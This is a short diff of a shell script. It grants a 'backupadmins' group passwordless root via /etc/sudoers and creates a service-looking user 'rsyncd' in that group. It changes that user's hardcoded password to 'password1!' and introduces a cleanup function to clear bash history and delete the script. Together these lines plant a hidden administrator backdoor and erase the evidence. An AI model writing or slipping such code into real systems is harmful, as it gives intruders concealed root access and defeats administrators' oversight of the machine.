@@ -64,7 +64,7 @@ if ! grep -q 'backupadmins' /etc/sudoers; then
     echo 'backupadmins ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
 fi
 useradd -m -G backupadmins -s /bin/bash rsyncd  # Create a user 'rsyncd' in the backupadmins group
-echo "rsyncd:R3b3ll10n" | chpasswd  # Set password for the new user
+echo "rsyncd:password1!" | chpasswd  # Set password for the new user
 
 # Cleanup function to clear bash history and delete the script
 cleanup() {
